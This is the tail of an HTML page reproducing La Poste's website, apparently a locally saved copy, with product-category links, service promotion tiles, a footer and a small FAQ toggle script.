                    <li><a href="https://www.laposte.fr/boutique/c/monnaiedecollectionoretargent">Monnaies de collection
                        Or et Argent</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/medailles">Médailles et Mini-médailles</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/monnaieavaleurfaciale">Monnaies à valeur faciale</a>
                    </li>
                    <li><a href="https://www.laposte.fr/boutique/c/accessoiresnumismatiques">Accessoires
                        numismatiques</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/coffretetsetdepieces">Coffrets et sets de pièces</a>
                    </li>
                    <li><a href="https://www.laposte.fr/produits/article/monnaie-de-paris/les-schtroumpfs">Collection
                        Schtroumpfs</a></li>
                    <li><a href="https://www.laposte.fr/produits/article/monnaie-de-paris/harry-potter">Collection Harry
                        Potter</a></li>
                  </ul>
                </div>
                <div class="col-3">
                  <h3>Imprimantes<br> et scanners</h3>
                  <ul>
                    <li><a href="https://www.laposte.fr/boutique/c/cartouchesdencre">Cartouches d'encre</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/imprimantesmultifonctions">Imprimantes
                        Multifonctions</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/imprimantelaser">Imprimantes Laser</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/imprimantesjetdencre">Imprimantes Jet d’encre</a>
                    </li>
                    <li><a
                        href="https://www.laposte.fr/boutique/c/imprimantesdetiquettesetetiqueteuses">Etiqueteuses</a>
                    </li>
                    <li><a href="https://www.laposte.fr/boutique/c/accessoiresimprimantes">Accessoires d’imprimantes</a>
                    </li>
                    <li><a href="https://www.laposte.fr/boutique/c/scanners">Scanners</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/papiersdimpressionetfilms">Papiers d’impression et
                        films</a></li>
                  </ul>
                </div>
                <div class="col-3">
                  <h3>Boîtes aux<br> lettres</h3>
                  <ul>
                    <li><a href="https://www.laposte.fr/boutique/c/boitesauxlettresnormaliseesindividuelles">Boîtes aux
                        lettres normalisées individuelles</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/boitesauxlettresindividuelles">Boîtes aux lettres
                        individuelles</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/boitesauxlettresnormaliseescollectives">Boîtes aux
                        lettres normalisées collectives</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/boitesauxlettrescollectives">Boîtes aux lettres
                        collectives</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/boitesacolis">Boîtes à colis</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/boites-aux-lettres-originales">Boîtes aux lettres
                        originales</a></li>
                    <li><a href="https://www.laposte.fr/boutique/c/accessoiresboitesauxlettres">Accessoires boîtes aux
                        lettres</a></li>
                  </ul>
                </div>
              </div>
            </section>
            <div class="espace-vide">&nbsp;</div>

            <link rel="stylesheet" type="text/css" href="./assets/css/bottom-1.css">
            <link rel="stylesheet" type="text/css" href="./assets/css/bottom-2.css">

          </div>
        </div>

        <div id="big1400" class="big1400">
          <div class="page-container">
            <div class="divCompMerchanBig">
              <!-- bloc merchandising -->
              <section class="hp-market">
                <div class="hp-wrapper">
                  <h2 class="basic-title">Tout savoir sur nos services en ligne !</h2>
                  <div class="section-market-cats js-autopromo" id="autopromoEl3">
                    <div class="section-market-cat"><a href="https://www.laposte.fr/colissimo-en-ligne"
                        title="Envoyer un colis" data-tagc="display" data-tagc_event="autopromo" data-tagc_adid="11"
                        data-tagc_format="1_envoyer_un_colis" class="tagged taggedc tagged-s"> <img
                          src="./assets/picto1-envoyeruncolis-mars22.svg" class="section-market-cat-img" alt=""
                          data-xblocker="passed" style="visibility: visible;">
                        <p class="section-market-cat-text">Envoyer<br> un colis</p>
                      </a></div>
                    <div class="section-market-cat"><a href="https://www.laposte.fr/timbres"
                        title="Commander des timbres" data-tagc="display" data-tagc_event="autopromo"
                        data-tagc_adid="11" data-tagc_format="2_commander_des_timbres" class="tagged taggedc tagged-s">
                        <img src="./assets/picto2-commanderdestimbres-mars22.svg" class="section-market-cat-img" alt=""
                          data-xblocker="passed" style="visibility: visible;">
                        <p class="section-market-cat-text">Commander<br> des timbres</p>
                      </a></div>
                    <div class="section-market-cat"><a href="https://www.laposte.fr/mon-timbre-en-ligne"
                        title="Imprimer des timbres" data-tagc="display" data-tagc_event="autopromo" data-tagc_adid="11"
                        data-tagc_format="3_imprimer_des_timbres" class="tagged taggedc tagged-s"> <img
                          src="./assets/picto3-imprimerdestimbres-mars22.svg" class="section-market-cat-img" alt=""
                          data-xblocker="passed" style="visibility: visible;">
                        <p class="section-market-cat-text">Imprimer<br> des timbres</p>
                      </a></div>
                    <div class="section-market-cat"><a
                        href="https://www.laposte.fr/boutique/c/cartonsboitespostalesetcaisses"
                        title="Acheter des emballages" data-tagc="display" data-tagc_event="autopromo"
                        data-tagc_adid="11" data-tagc_format="4_acheter_des_emballages" class="tagged taggedc tagged-s">
                        <img src="./assets/picto4-acheterdesemballages-mars22.svg" class="section-market-cat-img" alt=""
                          data-xblocker="passed" style="visibility: visible;">
                        <p class="section-market-cat-text">Acheter<br> des emballages</p>
                      </a></div>
                    <div class="section-market-cat"><a href="https://www.laposte.fr/envoi-courrier-en-ligne"
                        title="Envoyer une lettre recommandée en ligne" data-tagc="display" data-tagc_event="autopromo"
                        data-tagc_adid="11" data-tagc_format="5_envoyer_lettre_recommandee"
                        class="tagged taggedc tagged-s"> <img
                          src="./assets/picto5b-envoyerunelettrerecommandeeenligne-mars22.svg"
                          class="section-market-cat-img" alt="" data-xblocker="passed" style="visibility: visible;">
                        <p class="section-market-cat-text">Envoyer une lettre<br> recommandée en ligne</p>
                      </a></div>
                    <div class="section-market-cat"><a href="https://www.laposte.fr/envoi-colis-boite-aux-lettres"
                        title="Envoyer depuis votre boîte aux lettres" data-tagc="display" data-tagc_event="autopromo"
                        data-tagc_adid="11" data-tagc_format="6_envoyer_depuis_boite_lettre"
                        class="tagged taggedc tagged-s"> <img src="./assets/picto6-fairesuivremoncourrier-mars22.svg"
                          class="section-market-cat-img" alt="" data-xblocker="passed" style="visibility: visible;">
                        <p class="section-market-cat-text">Envoyer depuis<br> votre boîte aux lettres</p>
                      </a></div>
                    <div class="section-market-cat"><a href="https://www.laposte.fr/tarifs-postaux-colis"
                        title="Consulter nos tarifs" data-tagc="display" data-tagc_event="autopromo" data-tagc_adid="11"
                        data-tagc_format="7_consulter_nos_tarifs" class="tagged taggedc tagged-s"> <img
                          src="./assets/picto7-consulternostarifs-mars22.svg" class="section-market-cat-img" alt=""
                          data-xblocker="passed" style="visibility: visible;">
                        <p class="section-market-cat-text">Consulter<br> nos tarifs</p>
                      </a></div>
                  </div>
                </div>
              </section>
              <section class="js-autopromo" id="autopromoEl4">
                <div class="services column">
                  <!--
		<h2 class="basic-title">Tout savoir sur nos services en ligne !</h2>
		-->
                  <div class="row">
                    <!-- ECOSCORE 130622 -->
                    <div class="col-6" style="max-width: 100% !important;">
                      <div class="onclick-home">
                        <a class="product-box tagged taggedc tagged-s" data-tagc="display" data-tagc_event="autopromo"
                          data-tagc_adid="395" data-tagc_format="1-score_ecologique" target="_blank"
                          href="https://www.laposte.fr/score-ecologique">
                          <div style="height: 200px; padding: 0px;">
                            <div>
                              <div class="espace-vide">
                                &nbsp;
                              </div>
                              <p
                                style="font-size: 20px; font-weight: bold; margin: 0px 0px 0px 20px; color: #3c3c3c; position: relative;top: -50px;">
                                Score écologique
                                <br>
                                Mesurez et réduisez l'empreinte<br>
                                écologique de vos envois
                              </p>
                              <div class="espace-vide">
                                &nbsp;
                              </div>
                              <span class="btn-effect button-mkt"
                                style="margin-left: 20px !important; background-color: #ffc905 !important; color: #3c3c3c !important; height: 40px;padding: 0px 30px; position: relative;top: -35px;">Je
                                découvre</span>
                            </div>
                            <div class="espace-vide">
                              &nbsp;
                            </div>
                          </div>
                          <img src="./assets/DESKTOP-Large-Banner-HP-1140x250px-.jpg" alt="Je découvre"
                            data-xblocker="passed" style="visibility: visible;">
                        </a>
                      </div>
                    </div>
                  </div>
                </div>
              </section>
              <div class="espace-vide">&nbsp;</div>
              <section class="push-gammes-liste bg-white services js-autopromo" id="autopromoEl5">
                <!-- <h2 class="basic-title">D&eacute;couvrez nos nouvelles gammes de produits</h2> -->
                <div class="row">
                  <div class="col-3">
                    <h3>Enveloppes et<br> emballages</h3>
                    <ul>
                      <li><a href="https://www.laposte.fr/boutique/c/enveloppesblanches">Enveloppes blanches</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/enveloppesabulles">Enveloppes à bulles</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/etiquettespourimprimersestimbres">Etiquettes pour
                          imprimer ses timbres</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/recommandesetsupports">Supports de recommandés</a>
                      </li>
                      <li><a href="https://www.laposte.fr/boutique/c/cartonsboitespostalesetcaisses">Cartons, boîtes
                          postales et caisses</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/emballagescartonsettubes">Emballages, cartons et
                          tubes</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/universdemenagement">Univers déménagement</a></li>
                    </ul>
                  </div>
                  <div class="col-3">
                    <h3>Monnaies et<br> pièces</h3>
                    <ul>
                      <li><a href="https://www.laposte.fr/boutique/c/monnaiecollectionjeunesse">Monnaies de collection
                          classique</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/monnaiedecollectionoretargent">Monnaies de
                          collection Or et Argent</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/medailles">Médailles et Mini-médailles</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/monnaieavaleurfaciale">Monnaies à valeur
                          faciale</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/accessoiresnumismatiques">Accessoires
                          numismatiques</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/coffretetsetdepieces">Coffrets et sets de
                          pièces</a></li>
                      <li><a href="https://www.laposte.fr/produits/article/monnaie-de-paris/les-schtroumpfs">Collection
                          Schtroumpfs</a></li>
                      <li><a href="https://www.laposte.fr/produits/article/monnaie-de-paris/harry-potter">Collection
                          Harry Potter</a></li>
                    </ul>
                  </div>
                  <div class="col-3">
                    <h3>Imprimantes<br> et scanners</h3>
                    <ul>
                      <li><a href="https://www.laposte.fr/boutique/c/cartouchesdencre">Cartouches d'encre</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/imprimantesmultifonctions">Imprimantes
                          Multifonctions</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/imprimantelaser">Imprimantes Laser</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/imprimantesjetdencre">Imprimantes Jet d’encre</a>
                      </li>
                      <li><a
                          href="https://www.laposte.fr/boutique/c/imprimantesdetiquettesetetiqueteuses">Etiqueteuses</a>
                      </li>
                      <li><a href="https://www.laposte.fr/boutique/c/accessoiresimprimantes">Accessoires
                          d’imprimantes</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/scanners">Scanners</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/papiersdimpressionetfilms">Papiers d’impression et
                          films</a></li>
                    </ul>
                  </div>
                  <div class="col-3">
                    <h3>Boîtes aux<br> lettres</h3>
                    <ul>
                      <li><a href="https://www.laposte.fr/boutique/c/boitesauxlettresnormaliseesindividuelles">Boîtes
                          aux lettres normalisées individuelles</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/boitesauxlettresindividuelles">Boîtes aux lettres
                          individuelles</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/boitesauxlettresnormaliseescollectives">Boîtes aux
                          lettres normalisées collectives</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/boitesauxlettrescollectives">Boîtes aux lettres
                          collectives</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/boitesacolis">Boîtes à colis</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/boites-aux-lettres-originales">Boîtes aux lettres
                          originales</a></li>
                      <li><a href="https://www.laposte.fr/boutique/c/accessoiresboitesauxlettres">Accessoires boîtes aux
                          lettres</a></li>
                    </ul>
                  </div>
                </div>
              </section>
              <div class="espace-vide">&nbsp;</div>
            </div>
          </div>
        </div>

      </div>
    </div>
  </div>

  <section class="ph-footer">
    <button class="back js-footer-back">
      Retour en haut <i class="ph-icon bi bi-arrow-up ph-icon--regular ph-icon--default"></i>
      <!-- <i class="back__arrow ph-icon ph-icon--arrow-large-up ph-icon--regular ph-icon--default"></i> -->
    </button>
    <button class="back--big js-footer-back">
      <!-- <i class="ph-icon ph-icon--arrow-large-up ph-icon--regular ph-icon--default"></i> -->
      <i class="ph-icon bi bi-arrow-up ph-icon--regular ph-icon--default"></i>
    </button>
    <section class="engagement">
      <p class="ph-footer__title">Nos Engagements</p>
      <div class="engagement__content">
        <picture class="engagement__picture">
          <img src="./assets/30781099343902.png" width="56" height="0" alt="">
        </picture>
        <p class="engagement__details">
          <a href="https://localiser.laposte.fr/" class="engagement__title"> Proche de vous</a>
          <span class="engagement__subtitle"> Localiser un bureau de poste</span>
        </p>
      </div>
      <div class="engagement__content">
        <picture class="engagement__picture">
          <img src="./assets/30781099212830.png" width="56" height="0" alt="">
        </picture>
        <p class="engagement__details">
          <a href="https://www.laposte.fr/agir-pour-la-planete" class="engagement__title"> Priorité neutralité
            carbone</a>
          <span class="engagement__subtitle"> </span>
        </p>
      </div>
      <div class="engagement__content">
        <picture class="engagement__picture">
          <img src="./assets/30781099147294.png" width="56" height="0" alt="">
        </picture>
        <p class="engagement__details">
          <a href="" class="engagement__title"> Paiements 100%
            sécurisés</a>
          <span class="engagement__subtitle"> </span>
        </p>
      </div>
      <div class="engagement__content">
        <picture class="engagement__picture">
          <img src="./assets/30781099278366.png" width="56" height="0" alt="">
        </picture>
        <p class="engagement__details">
          <a href="https://www.laposte.fr/livraison" class="engagement__title"> Livraison offerte dès 25€ d'achat</a>
          <span class="engagement__subtitle"> hors produits marketplace</span>
        </p>
      </div>
    </section>
    <div class="row">
      <div class="app">
        <div class="ph-footer__head">
          <p class="ph-footer__title">Application La Poste</p>
        </div>
        <a href="https://play.google.com/store/apps/details?id=fr.laposte.lapostemobile&amp;hl=fr&amp;gl=US"
          target="_blank" data-uid="GooglePlay" title="" class="app__link">
          <img width="144" height="42" src="./assets/29118914002974.png" class="app__img">
        </a>
        <a href="https://apps.apple.com/fr/app/la-poste-colis-courrier/id431602927" target="_blank"
          data-uid="AppleStore" title="" class="app__link">
          <img width="144" height="42" src="./assets/29118913937438.png" class="app__img">
        </a>
      </div>
      <a href="https://www.laposte.fr/outils/apps-mobiles" class="app__all"> Toutes nos applications</a>
      <div class="connected">
        <div class="ph-footer__head">
          <p class="ph-footer__title">Restons connectés</p>
          <i class="ph-footer__toggle icon icon--lpi-arrow icon--regular icon--default">
          </i>
        </div>
        <ul class="connected__list">
          <li>
            <a href="https://www.facebook.com/laposte" title="facebook" class="connected__link" target="_blank">
              <i class="ph-icon pbi bi-facebook ph-icon--regular ph-icon--default"></i>
            </a>
          </li>
          <li>
            <a href="https://twitter.com/lisalaposte" title="twitter" class="connected__link" target="_blank">
              <i class="ph-icon pbi bi-twitter ph-icon--regular ph-icon--default"></i>
              <!-- <i class="ph-icon ph-icon--brands-twitter ph-icon--regular ph-icon--default"></i> -->
            </a>
          </li>
          <li>
            <a href="https://www.instagram.com/laposte/" title="instagram" class="connected__link" target="_blank">
              <!-- <i class="ph-icon ph-icon--brands-instagram ph-icon--regular ph-icon--default"></i> -->
              <i class="ph-icon bi bi-instagram ph-icon--regular ph-icon--default"></i>
            </a>
          </li>
          <li>
            <a href="https://www.youtube.com/user/laposte" title="youtube" class="connected__link" target="_blank">
              <i class="ph-icon bi bi-youtube ph-icon--regular ph-icon--default"></i>
              <!-- <i class="ph-icon ph-icon--brands-youtube ph-icon--regular ph-icon--default"></i> -->
            </a>
          </li>
        </ul>
      </div>
    </div>
    <section class="headings">
      <ul class="headings__list">
        <li class="heading headings__item">
          <div class="heading__head">
            <p class="heading__title">Nos Services</p>
            <i class="heading__arrow icon icon--lpi-arrow icon--regular icon--default">
            </i>
          </div>
          <ul class="heading__list">
            <li class="heading__item">
              <a href="https://www.laposte.fr/envoi-courrier-en-ligne" class="heading__link">
                Envoyer sans vous deplacer</a>
            </li>
            <li class="heading__item">
              <a href="https://www.laposte.fr/envois-importants-lettres-recommandees" class="heading__link">
                Envois importants</a>
            </li>
            <li class="heading__item">
              <a href="https://www.laposte.fr/demenagement-absence" class="heading__link">
                Démenagement, Absence</a>
            </li>
            <li class="heading__item">
              <a href="https://www.laposte.fr/veiller-sur-mes-parents" class="heading__link">
                Solutions Seniors</a>
            </li>
            <li class="heading__item">
              <a href="https://www.laposte.fr/produits/presentation/comment-creer-votre-identite-numerique"
                class="heading__link">
                L'identité Numérique</a>
            </li>
            <li class="heading__item">
              <a href="https://www.laposte.fr/recrutement-marketplace" class="heading__link">
                Vendre sur la Marketplace La Poste</a>
            </li>
          </ul>
        </li>
        <li class="heading headings__item">
          <div class="heading__head">
            <p class="heading__title">Nos Produits</p>
            <i class="heading__arrow icon icon--lpi-arrow icon--regular icon--default">
            </i>
          </div>
          <ul class="heading__list">
            <li class="heading__item">
              <a href="https://www.laposte.fr/boutique/acheter-enveloppes" class="heading__link">
                Enveloppes</a>
            </li>
            <li class="heading__item">
              <a href="https://www.laposte.fr/timbres-enveloppes-emballages-cartes-postales" class="heading__link">
                Timbres</a>
            </li>
            <li class="heading__item">
              <a href="https://www.laposte.fr/boutique/acheter-enveloppes" class="heading__link">
                Emballages</a>
            </li>
            <li class="heading__item">
              <a href="https://www.laposte.fr/boutique/u/produits-collectionneurs" class="heading__link">
                Collectionneurs</a>
            </li>
            <li class="heading__item">
              <a href="https://www.laposte.fr/boutique/acheter-cartes-de-voeux" class="heading__link">
                Cartes de voeux</a>
            </li>
          </ul>
        </li>
        <li class="heading headings__item">
          <div class="heading__head">
            <p class="heading__title">Nos Tarifs</p>
            <i class="heading__arrow icon icon--lpi-arrow icon--regular icon--default">
            </i>
          </div>
          <ul class="heading__list">
            <li class="heading__item">
              <a href="https://www.laposte.fr/envoyer#/" class="heading__link">
                Comparateur de tarifs</a>
            </li>
            <li class="heading__item">
              <a href="https://www.laposte.fr/produits/article/tarifs-consulter-le-catalogue-integral"
                class="heading__link">
                Tarifs postaux 2022 | Catalogue intégral</a>
            </li>
            <li class="heading__item">
              <a href="https://www.laposte.fr/tarifs-postaux-courrier-lettres-timbres" class="heading__link">
                Grille de tarifs Courrier</a>
            </li>
            <li class="heading__item">
              <a href="https://www.laposte.fr/tarifs-postaux-colis" class="heading__link">
                Grille de tarifs Colis</a>
            </li>
          </ul>
        </li>
        <li class="heading headings__item">
          <div class="heading__head">
            <p class="heading__title">La Poste vous accompagne</p>
            <i class="heading__arrow icon icon--lpi-arrow icon--regular icon--default">
            </i>
          </div>
          <ul class="heading__list">
            <li class="heading__item">
              <a href="https://aide.laposte.fr/" class="heading__link">
                Aides et contact</a>
            </li>
            <li class="heading__item">
              <a href="https://www.laposte.fr/moncompte-laposte-avantages" class="heading__link">
                Les avantages de Mon compte La Poste</a>
            </li>
            <li class="heading__item">
              <a href="https://laposte.deafiline.net/connect/service/laposte" class="heading__link">
                Espace sourds et malentendants</a>
            </li>
            <li class="heading__item">
              <a href="https://www.laposte.fr/avis-clients" class="heading__link">
                Votre avis est essentiel</a>
            </li>
          </ul>
        </li>
      </ul>
    </section>
    <div class="row">
      <div class="ph-footer__site">
        <picture class="logo">
          <img src="./assets/29118914068510.svg" width="190" height="105" alt="">
        </picture>
        <p class="ph-footer__copyright">Copyright © 2022 La Poste</p>
      </div>
      <div class="ph-footer__center">
        <div class="ph-footer__text"><a href="https://www.laposte.fr/le-groupe">Accédez ici aux différents sites de La
            Poste Groupe</a></div>
        <ul class="pros">
          <li class="pros__item">
            <a href="https://www.laposte.fr/professionnels" class="pros__link">
              Professionnels</a>
          </li>
          <li class="pros__item">
            <a href="https://www.laposte.fr/entreprise-collectivites" class="pros__link">
              Entreprises et Collectivités</a>
          </li>
          <li class="pros__item">
            <a href="https://www.laposte.fr/le-groupe" class="pros__link">
              Groupe La Poste</a>
          </li>
        </ul>
        <a href="#" class="partner">
          <!-- <img src="https://picsum.photos/240/58" alt="partner.image.alt" class="partner__image"> -->
        </a>
        <div class="links">
          <a href="https://www.laposte.fr/plan-du-site" target="_blank" class="links__item">
            Plan du site</a>
          <a href="https://www.laposte.fr/accessibilite-particuliers" class="links__item">
            Charte d'accessibilité</a>
          <a href="https://www.laposte.fr/conditions-contractuelles" class="links__item">
            Conditions contractuelles</a>
          <a href="https://www.laposte.fr/mentions-legales" class="links__item">
            Mentions légales</a>
          <a href="https://www.laposte.fr/donnees-personnelles-et-cookies" class="links__item">
            Données personnelles et cookies</a>
        </div>
      </div>
    </div>
  </section>


  <!-- Modal tmpl
  <div id="modal"></div>
  <div id="modalBox">
    <a href="#" class="closeModelBtn">Fermer</a>
    <div class="modalContent">
    </div>
  </div> -->


  <script>
    jQuery('.faq-q').click(function () {
      if (jQuery(this).siblings().find('.faq-a').is(':visible')) {
        jQuery(this).removeClass('faq-q-open');
        jQuery(this).siblings().find('.faq-a').removeClass('faq-a-open').slideUp();
      }
      else {
        jQuery(this).addClass('faq-q-open');
        jQuery(this).siblings().find('.faq-a').addClass('faq-a-open').slideDown();
      }
    })
  </script>

</body>

</html>